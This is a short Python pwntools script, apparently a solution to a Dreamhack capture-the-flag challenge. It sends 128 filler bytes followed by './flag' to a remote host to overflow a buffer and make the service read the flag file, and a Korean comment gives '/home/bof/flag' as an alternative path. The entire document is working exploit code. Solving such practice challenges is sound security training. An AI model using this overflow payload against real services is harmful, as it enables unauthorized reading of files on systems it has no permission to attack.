from pwn import *

p = remote('host3.dreamhack.games', 14559)

payload = b'a' * 128
payload += b'./flag'
# payload += b'/home/bof/flag' # 이것도 가능

p.sendlineafter(b'meow? ', payload)
p.interactive()